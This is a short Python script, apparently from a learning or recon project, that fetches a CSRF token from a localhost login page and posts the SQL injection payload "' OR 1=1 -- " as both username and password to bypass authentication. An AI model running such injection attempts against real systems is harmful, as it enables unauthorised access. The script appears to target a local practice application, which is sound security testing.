
import requests
from src.recon.spider import html_extractor
from bs4 import BeautifulSoup

# Cria uma sessão para manter cookies e headers

def login_test(url, dictionary_login, session):
    """Realiza o POST de login e retorna o response."""
    try:
        response = session.post(url, data=dictionary_login)
        return response
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return

def token_extractor(url, token_name, session):
    """Extrai o valor do token CSRF da página de login."""
    soup = html_extractor(url, session)
    token = soup.find("input", {"name": token_name})['value']
    return token

with requests.Session() as session_actual:
    # Extrai o token CSRF da página de login
    user_token = token_extractor("http://localhost/login.php", "user_token", session_actual)

    # Monta o dicionário de login
    dictionary_login = {
        "username": "' OR 1=1 -- ",
        "password": "' OR 1=1 -- ",
        "user_token": f"{user_token}",
        "Login": "Login"
    }

    # Realiza o login
    resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)

    # Exibe o HTML retornado
    #print(resposta.text)
    soup = BeautifulSoup(resposta.text, "html.parser")
    print(soup.prettify())
